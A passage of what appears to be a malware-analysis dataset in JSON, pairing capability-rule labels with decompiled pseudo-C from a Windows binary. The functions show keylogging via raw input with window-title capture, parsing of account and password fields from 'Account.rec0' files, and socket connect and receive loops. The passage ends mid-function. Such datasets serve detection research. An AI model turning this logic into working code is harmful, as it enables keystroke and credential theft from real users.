        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00406871(uint pNodeName, uint hostshort)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    uint uVar5;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    int32_t pAddrInfo;\n    \n    pAddrInfo = 0;\n    fcn.0040415d(&pNodeName);\n    *(in_ECX + 4) = hostshort;\n    fcn.00414047();\n    var_24h = 0;\n    var_20h = 0;\n    var_18h = 6;\n    uVar5 = 1;\n    _var_14h = 0;\n    _var_ch = 0;\n    var_1ch = 1;\n    iVar2 = (*_sym.imp.WS2_32.dll_getaddrinfo)(pNodeName, 0, &var_24h, &pAddrInfo);\n    if (iVar2 == 0) {\n        iVar2 = *(pAddrInfo + 0x18);\n        iVar3 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 0);\n        *(in_ECX + 0xc) = iVar3;\n        if (iVar3 != -1) {\n            *(in_ECX + 0x1cc) = *(iVar2 + 4);\n            *(in_ECX + 0x1c8) = 2;\n            uVar1 = (*_sym.imp.WS2_32.dll_htons)(hostshort);\n            *(in_ECX + 0x1ca) = uVar1;\n            (*_sym.imp.WS2_32.dll_freeaddrinfo)(pAddrInfo);\n            uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"Ws2_32.dll\");\n            (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4, \"connect\");\n            iVar2 = (*_sym.imp.WS2_32.dll_WSAConnect)(*(in_ECX + 0xc), in_ECX + 0x1c8, 0x10, 0, 0, 0, 0);\n            if (iVar2 != -1) {\n                *(in_ECX + 8) = 1;\n                (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*(in_ECX + 0x1d8));\n                goto code_r0x0040694c;\n            }\n            *(in_ECX + 0xc) = 0xffffffff;\n        }\n    }\n    uVar5 = 0;\ncode_r0x0040694c:\n    fcn.00406f1d();\n    return uVar5;\n}\n",
        "token_count": 634
    },
    "0040820b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.0040820b(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    ulong uVar4;\n    ulong uVar5;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint name;\n    uint var_18h;\n    uint var_ch;\n    uint var_8h;\n    int32_t pAddrInfo;\n    \n    uVar4 = CONCAT44(var_ch, var_8h);\n    do {\n        var_3ch = 0;\n        _var_2ch = 0;\n        _var_24h = 0;\n        var_34h = 1;\n        var_30h = 6;\n        var_38h = var_3ch;\n        pAddrInfo = var_3ch;\n        iVar1 = (*_sym.imp.WS2_32.dll_getaddrinfo)(\"microsoft.com\", 0, &var_3ch, &pAddrInfo);\n        var_ch = uVar4 >> 0x20;\n        var_8h = uVar4;\n        if (iVar1 != 0) {\n            return 0;\n        }\n        iVar1 = *(pAddrInfo + 0x18);\n        iVar2 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 0);\n        var_ch = uVar4 >> 0x20;\n        var_8h = uVar4;\n        if (iVar2 == -1) {\n            return 0;\n        }\n        var_18h = *(iVar1 + 4);\n        name._0_2_ = 2;\n        name._2_2_ = (*_sym.imp.WS2_32.dll_htons)(0x50);\n        var_ch = uVar4 >> 0x20;\n        var_8h = uVar4;\n        (*_sym.imp.WS2_32.dll_freeaddrinfo)(pAddrInfo);\n        var_ch = uVar4 >> 0x20;\n        var_8h = uVar4;\n        iVar1 = (*_sym.imp.WS2_32.dll_WSAConnect)(iVar2, &name, 0x10, 0, 0, 0, 0);\n        var_ch = uVar4 >> 0x20;\n        var_8h = uVar4;\n        if (iVar1 == -1) {\n            return 0;\n        }\n        (*_sym.imp.WS2_32.dll_send)\n                  (iVar2, \n                   \"\\r\\nGET http://microsoft.com/ HTTP/1.1\\r\\nHost: microsoft.com\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate\\r\\nConnection: keep-alive\\r\\nUpgrade-Insecure-Requests: 1\\r\\n\"\n                   , 0x16c, 0);\n        var_ch = uVar4 >> 0x20;\n        var_8h = uVar4;\n        uVar3 = fcn.00401000(0x200);\n        var_ch = uVar4 >> 0x20;\n        var_8h = uVar4;\n        iVar1 = (*_sym.imp.WS2_32.dll_recv)(iVar2, uVar3, 0x200, 0);\n        var_ch = uVar4 >> 0x20;\n        var_8h = uVar4;\n        uVar5 = uVar4;\n        uVar4 = fcn.00408179();\n        var_ch = uVar5 >> 0x20;\n        var_8h = uVar5;\n        fcn.00401014(uVar3);\n        var_ch = uVar4 >> 0x20;\n        var_8h = uVar4;\n        (*_sym.imp.WS2_32.dll_closesocket)(iVar2);\n        var_ch = uVar4 >> 0x20;\n        var_8h = uVar4;\n    } while (iVar1 < 100);\n    return uVar4;\n}\n",
        "token_count": 983
    },
    "0040b347": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040b347(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char16_t *arg_8h_00;\n    uint uVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    uint uVar7;\n    int32_t unaff_EDI;\n    int32_t *piVar8;\n    uchar *arg_8h_01;\n    uint arg_18h;\n    uint uStack612;\n    ushort uStack576;\n    ushort uStack574;\n    int32_t iStack572;\n    int32_t iStack568;\n    uint uStack564;\n    uint uStack560;\n    uchar auStack556 [12];\n    uchar auStack544 [16];\n    uchar auStack528 [36];\n    uchar auStack492 [488];\n    \n    uVar7 = 0;\n    fcn.00401293(&stack0xfffffdf0);\n    if (arg_ch == 1) {\n        uStack574 = 6;\n        iStack568 = arg_8h;\n        iStack572 = 0x130;\n        uStack576 = 1;\n        (*_sym.imp.USER32.dll_RegisterRawInputDevices)(&stack0xfffffdc0);\n        goto code_r0x0040b766;\n    }\n    if (arg_ch == 0x10) {\n        (*_sym.imp.USER32.dll_PostQuitMessage)();\n        goto code_r0x0040b766;\n    }\n    if (arg_ch != 0xff) {\n        uVar7 = (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch);\n        goto code_r0x0040b766;\n    }\n    iVar2 = (*_sym.imp.USER32.dll_GetRawInputData)(arg_14h, 0x10000003, 0);\n    if (iVar2 == -1) goto code_r0x0040b766;\n    iVar2 = fcn.00406fa7();\n    if (iVar2 == 0) goto code_r0x0040b766;\n    iVar3 = (*_sym.imp.USER32.dll_GetRawInputData)(arg_14h, 0x10000003, iVar2, &stack0xfffffd90, 0x10);\n    if (iVar3 != unaff_EDI) {\n        fcn.00406f8d();\n        goto code_r0x0040b766;\n    }\n    if (*(iVar2 + 0x18) != 0x100) goto code_r0x0040b766;\n    uVar7 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    iVar2 = (*_sym.imp.USER32.dll_GetWindowTextW)(uVar7, &stack0xfffffde0, 0x104);\n    if (iVar2 < 1) {\n        arg_8h_00 = L\"Unknow\";\n        fcn.0040428f(L\"Unknow\");\n    }\n    else {\n        arg_8h_00 = fcn.0040460a(&stack0xfffffe14);\n        fcn.004043c7(arg_8h_00);\n        fcn.00406f1d();\n    }\n    fcn.0040b8c7();\n    uStack560 = 0;\n    if (iStack572 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        uStack564 = fcn.00406e8d();\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n    }\n    piVar5 = *0x41e6a0 + 4;\n    fcn.004043fa(piVar5);\n    if (**0x41e6a0 != 0) {\n        iStack568 = (*0x41e6a0)[0x294];\n        arg_18h = 0x40b4d1;\n        fcn.0040153f(*0x41e6a0 + 0x286);\n        uVar7 = 0;\n        if (iStack568 != 0) {\n            (*_sym.imp.KERNEL32.dll_lstrlenW)(iStack568);\n            uVar4 = fcn.00406f2c();\n            *arg_8h_00 = uVar4;\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar4, iStack572);\n        }\n    // WARNING: Ignoring partial resolution of indirect\n        arg_8h_01 = &stack0xfffffdd4;\n        uVar4 = uStack564;\n        fcn.00404656(arg_8h_01);\n        piVar5 = fcn.00405980(arg_8h_01, uVar7, uVar4, unaff_EDI, arg_18h);\n        fcn.00405f32(piVar5);\n        fcn.00405966();\n    }\n    if ((*0x41e6a0)[0x285] != 0) {\n        piVar8 = *0x41e6a0 + 0x84;\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(piVar8);\n        if (iVar2 == 0) {\ncode_r0x0040b5a9:\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x41e6a0 + 0x84, uStack612, piVar8, piVar5);\n            piVar6 = *0x41e6a0;\n            (*0x41e6a0)[0x284] = 0;\n        }\n        else {\n            uVar7 = fcn.0040460a(*0x41e6a0 + 0x84);\n            iVar2 = fcn.00404276(uVar7);\n            fcn.00406f1d();\n            piVar6 = *0x41e6a0;\n            piVar5 = NULL;\n            if (iVar2 == 0) goto code_r0x0040b5a9;\n            (*0x41e6a0)[0x284] = 1;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(piVar6[3], 4, 1, 0, 4, 0x80, 0);\n        piVar5 = *0x41e6a0;\n        (*0x41e6a0)[1] = iVar2;\n        if (piVar5[0x284] == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x419d10);\n            (*_sym.imp.KERNEL32.dll_WriteFile)((*0x41e6a0)[1], 0x419d10, iVar2, piVar5 + 2, 0);\n            piVar5 = *0x41e6a0 + 2;\n            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x419d10);\n            pcVar1 = _sym.imp.KERNEL32.dll_WriteFile;\n            (*_sym.imp.KERNEL32.dll_WriteFile)((*0x41e6a0)[1], 0x419d10, uVar7, piVar5, 0);\n            piVar5 = *0x41e6a0 + 2;\n            if (iVar2 == 0) {\n                iVar3 = 0;\n            }\n            else {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar2);\n            }\n            (*pcVar1)((*0x41e6a0)[1], iVar2, iVar3 * 2, piVar5, 0);\n            piVar5 = *0x41e6a0 + 2;\n            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x419d10);\n            (*_sym.imp.KERNEL32.dll_WriteFile)((*0x41e6a0)[1], 0x419d10, uVar7, piVar5, 0);\n            piVar5 = *0x41e6a0 + 2;\n            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x419d10);\n            (*_sym.imp.KERNEL32.dll_WriteFile)((*0x41e6a0)[1], 0x419d10, uVar7, piVar5, 0);\n            piVar5 = *0x41e6a0;\n        }\n        uVar7 = fcn.0040b778();\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar7);\n        uVar7 = fcn.0040b778();\n        (*_sym.imp.KERNEL32.dll_WriteFile)((*0x41e6a0)[1], uVar7, iVar2 * 2, piVar5 + 2, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)((*0x41e6a0)[1]);\n    }\n    uVar7 = 0;\n    fcn.00406f8d();\n    fcn.004022f8();\ncode_r0x0040b766:\n    fcn.00406f1d();\n    return uVar7;\n}\n",
        "token_count": 2054
    },
    "0040bf94": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bf94(uint lpFileName)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t lpString2;\n    int32_t iVar7;\n    uint uVar8;\n    char *pcVar9;\n    uint8_t *puVar10;\n    uint *arg_8h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    \n    iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileA)(lpFileName, 0x80000000, 7, 0, 3, 0, 0);\n    if (iVar4 == -1) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(0xffffffff);\n    }\n    else {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar4, 0);\n        var_ch = uVar5;\n        pcVar6 = fcn.00401000(uVar5);\n        var_1ch = pcVar6;\n        fcn.00401293(pcVar6, 0, uVar5);\n        var_18h = 0;\n        (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, pcVar6, uVar5, &var_18h, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n        iVar4 = fcn.00406f2c();\n        var_14h = iVar4;\n        lpString2 = fcn.00406f2c();\n        var_8h = fcn.00406f2c();\n        uVar5 = 0;\n        bVar3 = false;\n        if (var_ch != 0) {\n            var_10h = 7 - iVar4;\n            pcVar9 = iVar4 + -7;\ncode_r0x0040c051:\n            var_20h = pcVar9;\n            cVar1 = pcVar6[uVar5];\n            pcVar9 = var_20h;\n            if ((0x5d < cVar1 - 0x21U) || (cVar1 == '=')) goto code_r0x0040c122;\n            var_20h[7] = cVar1;\n            pcVar9 = var_20h + 1;\n            if (!bVar3) {\n                if ((((7 < pcVar9 + var_10h) && (*pcVar9 == 'A')) &&\n                    ((var_20h[2] == 'c' && ((var_20h[3] == 'c' && (var_20h[4] == 'o')))))) &&\n                   ((var_20h[5] == 'u' && ((var_20h[6] == 'n' && (var_20h[7] == 't')))))) {\n                    iVar4 = 0;\n                    iVar7 = 2;\n                    if (*pcVar6 != -0x30) {\n                        iVar7 = 9;\n                    }\n                    puVar10 = pcVar6 + uVar5 + iVar7;\n                    uVar2 = *puVar10;\n                    while ((0x20 < uVar2 && (pcVar6 = var_1ch,  uVar2 < 0x7f))) {\n                        puVar10 = puVar10 + 1;\n                        *(iVar4 + lpString2) = uVar2;\n                        iVar4 = iVar4 + 1;\n                        uVar2 = *puVar10;\n                    }\n                    *(iVar4 + lpString2) = 0;\n                    bVar3 = true;\n                }\n                goto code_r0x0040c122;\n            }\n            if (((((*var_20h != 'P') || (*pcVar9 != 'a')) || (var_20h[2] != 's')) ||\n                ((var_20h[3] != 's' || (var_20h[4] != 'w')))) ||\n               ((var_20h[5] != 'o' || ((var_20h[6] != 'r' || (var_20h[7] != 'd')))))) goto code_r0x0040c122;\n            iVar4 = 0;\n            iVar7 = 2;\n            if (*pcVar6 != -0x30) {\n                iVar7 = 9;\n            }\n            puVar10 = pcVar6 + uVar5 + iVar7;\n            uVar2 = *puVar10;\n            while (((0x20 < uVar2 && (uVar2 < 0x7f)) && (uVar2 != 0x21))) {\n                *(iVar4 + var_8h) = uVar2;\n                iVar4 = iVar4 + 1;\n                puVar10 = puVar10 + 1;\n                uVar2 = *puVar10;\n            }\n            var_34h = 0;\n            var_30h = 0;\n            var_2ch = 0;\n            *(iVar4 + var_8h) = 0;\n            fcn.0040434f(var_8h);\n            fcn.0040434f(lpString2);\n            uVar8 = fcn.004040d5(&var_20h);\n            fcn.004043c7(uVar8);\n            fcn.00406f1d();\n            uVar8 = fcn.004040d5(&var_20h);\n            fcn.004043c7(uVar8);\n            fcn.00406f1d();\n            var_28h = 5;\n            uVar8 = fcn.0040460a(0x419490);\n            fcn.004043c7(uVar8);\n            fcn.00406f1d();\n            arg_8h = &var_34h;\n            fcn.00402790(arg_8h);\n            fcn.0040283b(arg_8h);\n            fcn.00406f1d();\n            fcn.00406f1d();\n            fcn.004015d4();\n        }\ncode_r0x0040c212:\n        fcn.00406f1d();\n        fcn.00406f1d();\n        fcn.00406f1d();\n        fcn.00401014(pcVar6);\n    }\n    return;\ncode_r0x0040c122:\n    uVar5 = uVar5 + 1;\n    if (var_ch <= uVar5) goto code_r0x0040c212;\n    goto code_r0x0040c051;\n}\n",
        "token_count": 1531
    },
    "0040c293": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040c293(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint lpFileName;\n    uint var_354h;\n    uint32_t lpFindFileData;\n    uint var_220h;\n    uint var_10ch;\n    \n    (*_sym.imp.KERNEL32.dll_GetFullPathNameA)(0x41e6b0, 0x104, &var_354h, 0);\n    pcVar1 = _sym.imp.SHLWAPI.dll_PathCombineA;\n    (*_sym.imp.SHLWAPI.dll_PathCombineA)(&lpFileName, &var_354h, 0x419e90);\n    iVar2 = (*_sym.imp.KERNEL32.dll_FindFirstFileA)(&lpFileName, &lpFindFileData);\n    if (iVar2 != -1) {\n        do {\n            if (((lpFindFileData | 0x10) == 0x10) && (var_220h != '.')) {\n                (*pcVar1)(&var_10ch, 0x41e6b0, &var_220h);\n                (*pcVar1)(&var_10ch, &var_10ch, \"Accounts\\\\Account.rec0\");\n                fcn.0040bf94(&var_10ch);\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_FindNextFileA)(iVar2, &lpFindFileData);\n        } while (iVar3 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 344
    },
    "00410514": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410514(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EDX;\n    uint uVar3;\n    int32_t lpFileSize;\n    int32_t var_ch;\n    int32_t lpNumberOfBytesRead;\n    int32_t *hMem;\n    \n    uVar3 = 0;\n    if (*0x41e8c0 == 0) {\n        hMem = in_EDX;\n        iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n        if ((iVar1 != 0) && (iVar1 != -1)) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(iVar1, &lpFileSize);\n            if ((iVar2 != 0) && (var_ch == 0)) {\n                *arg_8h = lpFileSize;\n                iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, lpFileSize);\n                *hMem = iVar2;\n                if (iVar2 != 0) {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar1, iVar2, *arg_8h, &lpNumberOfBytesRead, 0);\n                    if ((iVar2 == 0) || (*arg_8h != lpNumberOfBytesRead)) {\n                        (*_sym.imp.KERNEL32.dll_LocalFree)(*hMem);\n                    }\n                    else {\n                        uVar3 = 1;\n                    }\n                }\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        }\n    }\n    else {\n        uVar3 = fcn.004105c0(arg_8h);\n    }\n    return uVar3;\n}\n",
        "token_count": 377
    },
    "004109fb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004109fb(uint *arg_8h)\n\n{\n    char cVar1;\n    int32_t buf;\n    uint var_1000h;\n    uint uStackY32;\n    uint uStackY28;\n    uint *puStackY24;\n    uint uStackY20;\n    \n    fcn.00401230();\n    puStackY24 = &fcn.004109fb::var_1000h;\n    uStackY20 = 0;\n    uStackY28 = 0x410a1e;\n    fcn.00401293();\n    while( true ) {\n        puStackY24 = &fcn.004109fb::var_1000h;\n        uStackY20 = 0x1000;\n        uStackY28 = *arg_8h;\n        uStackY32 = 0x410a5b;\n        buf = (*_sym.imp.WS2_32.dll_recv)();\n        if (buf == -1) {\n            return 0;\n        }\n        uStackY20 = 0x410a32;\n        cVar1 = fcn.00410c08(buf);\n        if (cVar1 == '\\0') break;\n        puStackY24 = &fcn.004109fb::var_1000h;\n        uStackY20 = 0;\n        uStackY28 = 0x410a46;\n        fcn.00401293();\n    }\n    return 0;\n}\n",
        "token_count": 316
    },
    "00410a68": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410a68(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t buf;\n    uint var_1000h;\n    uint uStackY32;\n    uint uStackY28;\n    uint *puStackY24;\n    uint uStackY20;\n    \n    fcn.00401230();\n    puStackY24 = &fcn.00410a68::var_1000h;\n    uStackY20 = 0;\n    uStackY28 = 0x410a8b;\n    fcn.00401293();\n    while( true ) {\n        puStackY24 = &fcn.00410a68::var_1000h;\n        uStackY20 = 0x1000;\n        uStackY28 = *(arg_8h + 4);\n        uStackY32 = 0x410ac8;\n        buf = (*_sym.imp.WS2_32.dll_recv)();\n        if (buf == -1) {\n            return 0;\n        }\n        uStackY20 = 0x410a9e;\n        cVar1 = fcn.00410c08(buf);\n        if (cVar1 == '\\0') break;\n        puStackY24 = &fcn.00410a68::var_1000h;\n        uStackY20 = 0;\n        uStackY28 = 0x410ab2;\n        fcn.00401293();\n    }\n    return 0;\n}\n",
        "token_count": 324
    },
    "00411906": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00411906(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint lpWSAData;\n    uint name;\n    uint var_ch;\n    \n    iVar1 = (*_sym.imp.WS2_32.dll_WSAStartup)(0x202, &lpWSAData);\n    if (iVar1 == 0) {\n        uVar2 = 1;\n        iVar1 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 6);\n        if (iVar1 == -1) {\ncode_r0x00411990:\n            uVar2 = 0;\n        }\n        else {\n            name._0_2_ = 2;\n            var_ch = (*_sym.imp.WS2_32.dll_inet_addr)(\"127.0.0.1\");\n            name._2_2_ = (*_sym.imp.WS2_32.dll_htons)(0xd3d);\n            iVar3 = (*_sym.imp.WS2_32.dll_connect)(iVar1, &name, 0x10);\n            if (iVar3 == -1) {\n                (*_sym.imp.WS2_32.dll_closesocket)();\n                (*_sym.imp.WS2_32.dll_WSACleanup)();\n                goto code_r0x00411928;\n            }\n            iVar1 = (*_sym.imp.WS2_32.dll_closesocket)(iVar1);\n            if (iVar1 == -1) goto code_r0x00411990;\n        }\n        (*_sym.imp.WS2_32.dll_WSACleanup)();\n    }\n    else {\ncode_r0x00411928:\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 387
    },
    "00412bca": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412bca(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uchar auStack408 [404];\n    \n    (*_sym.imp.WS2_32.dll_WSAStartup)(2, auStack408);\n    iVar1 = fcn.00412c20();\n    if (iVar1 == -1) {\n        (*_sym.imp.WS2_32.dll_WSACleanup)();\n    }\n    fcn.00401293(0x41e8d0, 0, 0x13332c);\n    fcn.00412cd5();\n    return;\n}\n",
        "token_count": 133
    },
    "00412f8a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00412f8a(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint arg_ch;\n    int32_t iVar4;\n    int32_t arg_10h;\n    int32_t iVar5;\n    uint var_10h;\n    uint var_ch;\n    uint s;\n    uint buf;\n    \n    uVar2 = *0x41e8c4;\n    puVar3 = fcn.00401000(0x2000);\n    arg_ch = fcn.00401000(0x2000);\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    iVar5 = 0;\n    while( true ) {\n        iVar4 = (*_sym.imp.WS2_32.dll_recv)(uVar2, arg_ch, 8 - iVar5, 0);\n        if (iVar4 == 0) {\n            *0x41e695 = 0;\n            return arg_8h;\n        }\n        if (iVar4 == -1) break;\n        fcn.0040126d(iVar5 + puVar3, arg_ch, iVar4);\n        iVar5 = iVar5 + iVar4;\n        if (7 < iVar5) {\n            uVar1 = *puVar3;\n            iVar4 = 0;\n            iVar5 = puVar3[1];\n            if (0 < iVar5) {\n                do {\n                    arg_10h = (*_sym.imp.WS2_32.dll_recv)(uVar2, arg_ch, iVar5 - iVar4, 0);\n                    if ((arg_10h == 0) || (arg_10h == -1)) {\n                        *0x41e695 = 0;\n                        return arg_8h;\n                    }\n                    fcn.0040126d(iVar4 + puVar3, arg_ch, arg_10h);\n                    iVar4 = iVar4 + arg_10h;\n                } while (iVar4 < iVar5);\n            }\n            *arg_8h = uVar1;\n            arg_8h[1] = iVar5;\n            arg_8h[2] = puVar3;\n            fcn.00401014(arg_ch);\n            return arg_8h;\n        }\n    }\n    *0x41e695 = 0;\n    return arg_8h;\n}\n",
        "token_count": 536
    },
    "00413068": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00413068(uint *param_1, ushort param_2)\n\n{\n    int32_t iVar1;\n    uint var_824h;\n    uint name;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint var_4h;\n    \n    var_4h = (*_sym.imp.WS2_32.dll_socket)(0x17, 1, 6);\n    name._0_2_ = 0x17;\n    var_18h = *param_1;\n    uStack24 = param_1[1];\n    uStack20 = param_1[2];\n    uStack16 = param_1[3];\n    name._2_2_ = param_2;\n    iVar1 = (*_sym.imp.WS2_32.dll_connect)(var_4h, &name, 0x1c);\n    if (iVar1 != -1) {\n        fcn.00401293(&var_824h, 0, 0x802);\n        (*_sym.imp.WS2_32.dll_InetNtopW)(0x17, &var_18h, &var_824h, 0x802);\n    }\n    return var_4h;\n}\n",
        "token_count": 289
    },
    "004130de": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004130de(uint *param_1, ushort param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_818h;\n    uint name;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *param_1;\n    uVar1 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 6);\n    name._0_2_ = 2;\n    var_10h = var_4h;\n    name._2_2_ = param_2;\n    iVar2 = (*_sym.imp.WS2_32.dll_connect)(uVar1, &name, 0x10);\n    if (iVar2 != -1) {\n        fcn.00401293(&var_818h, 0, 0x802);\n        (*_sym.imp.WS2_32.dll_InetNtopW)(2, &var_4h, &var_818h, 0x802);\n    }\n    return uVar1;\n}\n",
        "token_count": 245
    },
    "00413b2f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00413b2f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(param_1 + 4), 0xc0000000, 1, 0, 1, 0, 0);\n    *(param_1 + 8) = iVar1;\n    if ((iVar1 == -1) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0x50)) {\n        *(param_1 + 8) = 0;\n        uVar2 = fcn.00413f4f(0xc0000000);\n        return uVar2;\n    }\n    return *(param_1 + 8) != -1;\n}\n",
        "token_count": 189
    },
    "00413c83": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00413c83(uint lpFileName)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    int32_t iVar3;\n    uint in_ECX;\n    bool bVar4;\n    uint in_stack_fffffd44;\n    uint lpFindFileData;\n    uint var_268h;\n    uint var_264h;\n    uint var_258h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    var_28h = 5;\n    var_30h = 5;\n    var_2ch = 0;\n    var_ch = in_ECX;\n    fcn.00401bbd();\n    iVar2 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n    if (iVar2 != -1) {\n        do {\n            iVar3 = 0;\n            bVar4 = (lpFindFileData & 0x10) == 0;\n            if (bVar4) {\n                _var_1ch = CONCAT44(var_268h, var_264h);\n            }\n            else {\n                _var_1ch = 0;\n            }\n            var_14h = !bVar4;\n            var_24h = iVar3;\n            